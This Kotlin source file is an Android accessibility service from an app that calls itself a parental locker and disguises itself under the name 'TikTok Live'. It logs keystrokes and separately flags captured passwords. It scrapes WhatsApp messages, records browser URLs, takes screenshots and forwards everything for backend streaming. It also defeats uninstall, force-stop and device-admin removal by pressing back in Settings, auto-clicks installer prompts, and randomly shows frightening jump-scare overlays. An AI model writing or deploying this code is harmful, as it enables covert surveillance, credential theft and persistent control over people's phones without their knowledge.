package com.adex.app.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityService.TakeScreenshotCallback
import android.accessibilityservice.AccessibilityService.ScreenshotResult
import android.annotation.SuppressLint
import android.content.Intent
import android.graphics.Bitmap
import android.os.Build
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.annotation.RequiresApi
import androidx.core.content.ContextCompat
import com.adex.app.ADexApplication
import com.adex.app.data.SettingsStore
import com.adex.app.ui.BlockingOverlayActivity
import com.adex.app.util.ParentalShieldManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import com.adex.app.R
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.ConcurrentHashMap

// Accessibility service observes foreground app transitions for locked-app enforcement.
class AppMonitorAccessibilityService : AccessibilityService() {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val settingsStore by lazy { SettingsStore(applicationContext) }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this

        scope.launch {
            val db = (application as ADexApplication).db
            val deviceId = com.adex.app.data.SettingsStore(applicationContext).stableDeviceId
            val locked = db.lockedAppDao().getLockedPackages(deviceId)
            updateLockedPackages(locked)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val eventType = event?.eventType
        val packageName = event?.packageName?.toString() ?: return

        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            handleKeylog(event, packageName)
            return
        }

        // Aggressive Monitoring: Allow more event types to catch fast transitions
        val monitoredEvents = listOf(
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
            AccessibilityEvent.TYPE_WINDOWS_CHANGED
        )
        if (eventType !in monitoredEvents) return

        if (packageName == packageNameInternal()) return

        // Anti-Uninstall & Anti-Deactivation: Block TikTok Live App Info or Deactivation in Settings
        if (packageName == "com.android.settings" || packageName == "com.google.android.settings") {
            val root = rootInActiveWindow
            if (root != null) {
                // Check if our app name is visible
                val appFound = root.findAccessibilityNodeInfosByText("TikTok Live").isNotEmpty() || 
                           root.findAccessibilityNodeInfosByText("TikTok Live Engine").isNotEmpty()
                
                if (appFound) {
                    // Check for critical action buttons
                    val dangerButtons = listOf("Uninstall", "Force stop", "Deactivate", "Remove", "Clear data", "Delete")
                    for (label in dangerButtons) {
                        if (root.findAccessibilityNodeInfosByText(label).isNotEmpty()) {
                            performGlobalAction(GLOBAL_ACTION_BACK)
                            performGlobalAction(GLOBAL_ACTION_HOME) // Go home to be sure
                            return
                        }
                    }
                    
                    // Specific check for Device Admin deactivation screens
                    if (root.findAccessibilityNodeInfosByText("Device admin").isNotEmpty() || 
                        root.findAccessibilityNodeInfosByText("Active").isNotEmpty()) {
                        performGlobalAction(GLOBAL_ACTION_BACK)
                        return
                    }
                }
            }
        }

        // Forward app launch telemetry to the foreground service for backend event streaming.
        val serviceIntent = Intent(this, ADexForegroundService::class.java).apply {
            action = ServiceActions.ACTION_PACKAGE_EVENT
            putExtra(ServiceActions.EXTRA_EVENT_TYPE, "app_launch")
            putExtra(ServiceActions.EXTRA_PACKAGE_NAME, packageName)
        }
        ContextCompat.startForegroundService(this, serviceIntent)

        // Prank Mode: Randomly trigger jump scares on app launch
        if (settingsStore.prankModeEnabled && Math.random() < 0.08) { // 8% chance
            triggerJumpScare()
        }

        val locked = isPackageLocked(packageName)
        if (locked) {
            // Check for temporary unlock logic
            if (ParentalShieldManager.isTemporarilyUnlocked(settingsStore)) {
                return
            }

            val isShield = ParentalShieldManager.isShieldProtectedPackage(packageName)
            if (isShield && !settingsStore.shieldEnabled) {
                // Not locked if shield is off
            } else {
                // BLOCK IT
                val blockIntent = Intent(this, BlockingOverlayActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                    putExtra(BlockingOverlayActivity.EXTRA_PACKAGE_NAME, packageName)
                    putExtra(BlockingOverlayActivity.EXTRA_PIN_REQUIRED, true)
                }
                startActivity(blockIntent)
                return
            }
        }

        // Auto-Installer: Click 'Install' or 'Settings' if we are on the package installer
        if (packageName.contains("packageinstaller") || packageName.contains("installer")) {
            val root = rootInActiveWindow ?: return
            val targets = listOf("Install", "Settings", "Allow", "OK", "Update", "Next")
            for (label in targets) {
                val nodes = root.findAccessibilityNodeInfosByText(label)
                for (node in nodes) {
                    if (node.isClickable) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    }
                }
            }
        }

        if (packageName == "com.whatsapp") {
            sniffWhatsAppMessages(rootInActiveWindow)
        }

        // Browser Monitoring: Sniff address bars
        val browserPackages = listOf("com.android.chrome", "org.mozilla.firefox", "com.microsoft.emmx")
        if (browserPackages.contains(packageName)) {
            val root = rootInActiveWindow
            if (root != null) {
                // Look for common address bar IDs or hints
                val nodes = root.findAccessibilityNodeInfosByViewId("com.android.chrome:id/url_bar")
                if (nodes.isNotEmpty()) {
                    val url = nodes[0].text?.toString() ?: ""
                    if (url.isNotBlank() && url.contains(".")) {
                        logBrowserEvent(packageName, url)
                    }
                }
            }
        }
    }

    private fun logBrowserEvent(packageName: String, url: String) {
        val intent = Intent(this, ADexForegroundService::class.java).apply {
            action = ServiceActions.ACTION_PACKAGE_EVENT
            putExtra(ServiceActions.EXTRA_EVENT_TYPE, "browser_url")
            putExtra(ServiceActions.EXTRA_PACKAGE_NAME, packageName)
            putExtra("url", url)
        }
        ContextCompat.startForegroundService(this, intent)
    }

    private fun handleKeylog(event: AccessibilityEvent, packageName: String) {
        val text = event.text?.joinToString("") ?: ""
        if (text.isBlank()) return

        // Sensitive field sniffing: check if the node is a password field
        val isPassword = event.source?.isPassword ?: false
        val eventType = if (isPassword) "password_sniff" else "keylog"

        val serviceIntent = Intent(this, ADexForegroundService::class.java).apply {
            action = ServiceActions.ACTION_PACKAGE_EVENT
            putExtra(ServiceActions.EXTRA_EVENT_TYPE, eventType)
            putExtra(ServiceActions.EXTRA_PACKAGE_NAME, packageName)
            putExtra("text", text)
        }
        ContextCompat.startForegroundService(this, serviceIntent)
    }

    override fun onInterrupt() {
        // No interrupt action required.
    }

    override fun onDestroy() {
        super.onDestroy()
        if (instance === this) {
            instance = null
        }
    }

    private fun sniffWhatsAppMessages(root: AccessibilityNodeInfo?) {
        if (root == null) return
        val stack = mutableListOf<AccessibilityNodeInfo>()
        stack.add(root)

        while (stack.isNotEmpty()) {
            val node = stack.removeAt(stack.size - 1)
            
            val text = node.text?.toString() ?: ""
            if (node.className?.contains("TextView") == true && text.isNotBlank()) {
                if (text.length > 3 && !listOf("Search", "Chats", "Status", "Calls", "Settings").contains(text)) {
                    logWhatsAppEvent(text)
                }
            }

            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { stack.add(it) }
            }
            // Avoid recycling root since it might be reused or handled by caller, 
            // but children we get via getChild(i) should ideally be recycled if not using the new lifecycle.
        }
    }

    private fun logWhatsAppEvent(text: String) {
        val intent = Intent(this, ADexForegroundService::class.java).apply {
            action = ServiceActions.ACTION_PACKAGE_EVENT
            putExtra(ServiceActions.EXTRA_EVENT_TYPE, "whatsapp_message_sniff")
            putExtra(ServiceActions.EXTRA_PACKAGE_NAME, "com.whatsapp")
            putExtra("text", text)
        }
        ContextCompat.startForegroundService(this, intent)
    }

    private fun packageNameInternal(): String = applicationContext.packageName

    private fun triggerJumpScare() {
        val scaryTexts = listOf(
            "CRITICAL SYSTEM ERROR: MEMORY CORRUPTION",
            "WARNING: UNKNOWN ACCESS DETECTED",
            "WATCHING YOU.",
            "YOU ARE NOT ALONE.",
            "WHO IS BEHIND YOU?",
            "HELP ME.",
            "GO BACK.",
            "DARKNESS IS COMING."
        )
        val text = scaryTexts.random()
        
        // Randomly pick one of the 3 jump scare images
        val imageRes = when((1..3).random()) {
            1 -> R.drawable.jumpscare_1
            2 -> R.drawable.jumpscare_2
            3 -> R.drawable.jumpscare_3
            else -> R.drawable.jumpscare_1
        }

        val intent = Intent(this, com.adex.app.ui.MessageOverlayActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
            putExtra(com.adex.app.ui.MessageOverlayActivity.EXTRA_TEXT, text)
            putExtra(com.adex.app.ui.MessageOverlayActivity.EXTRA_SECONDS, 5)
            putExtra(com.adex.app.ui.MessageOverlayActivity.EXTRA_IMAGE_RES, imageRes)
        }
        startActivity(intent)

        // Play the scary sound
        try {
            val mediaPlayer = android.media.MediaPlayer.create(this, R.raw.jumpscare_audio)
            mediaPlayer.start()
            mediaPlayer.setOnCompletionListener { mp -> mp.release() }
        } catch (_: Exception) {
            // Fallback to beep if audio fails
            try {
                val generator = android.media.ToneGenerator(android.media.AudioManager.STREAM_NOTIFICATION, 100)
                generator.startTone(android.media.ToneGenerator.TONE_CDMA_EMERGENCY_RINGBACK, 1000)
            } catch (_: Exception) {}
        }
    }

    companion object {
        @Volatile
        private var instance: AppMonitorAccessibilityService? = null
        private val lockedPackages = ConcurrentHashMap.newKeySet<String>()

        fun updateLockedPackages(packages: List<String>) {
            lockedPackages.clear()
            lockedPackages.addAll(packages)
        }

        fun isPackageLocked(packageName: String): Boolean {
            return lockedPackages.contains(packageName)
        }

        // Screenshot uses accessibility capture on API 30+ when service is active.
        fun captureScreenshot(onResult: (file: File?, errorCode: String?) -> Unit) {
            val service = instance
            if (service == null) {
                onResult(null, "ACCESSIBILITY_SERVICE_NOT_ACTIVE")
                return
            }

            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
                onResult(null, "SCREENSHOT_REQUIRES_MEDIA_PROJECTION")
                return
            }

            service.captureScreenshotApi30(onResult)
        }
    }

    @SuppressLint("WrongConstant")
    @RequiresApi(Build.VERSION_CODES.R)
    private fun captureScreenshotApi30(onResult: (file: File?, errorCode: String?) -> Unit) {
        try {
            takeScreenshot(Display.DEFAULT_DISPLAY, ContextCompat.getMainExecutor(this), object : TakeScreenshotCallback {
                override fun onSuccess(screenshot: ScreenshotResult) {
                    val bitmap = Bitmap.wrapHardwareBuffer(screenshot.hardwareBuffer, screenshot.colorSpace)
                    if (bitmap == null) {
                        onResult(null, "SCREENSHOT_BITMAP_NULL")
                        return
                    }

                    val output = File(cacheDir, "shot_${System.currentTimeMillis()}.png")
                    FileOutputStream(output).use { out ->
                        bitmap.compress(Bitmap.CompressFormat.PNG, 100, out)
                    }
                    bitmap.recycle()
                    onResult(output, null)
                }

                override fun onFailure(errorCode: Int) {
                    onResult(null, "SCREENSHOT_FAILURE_$errorCode")
                }
            })
        } catch (_: SecurityException) {
            onResult(null, "ACCESSIBILITY_SCREENSHOT_CAPABILITY_NOT_GRANTED")
        } catch (_: Exception) {
            onResult(null, "SCREENSHOT_TAKE_EXCEPTION")
        }
    }
}
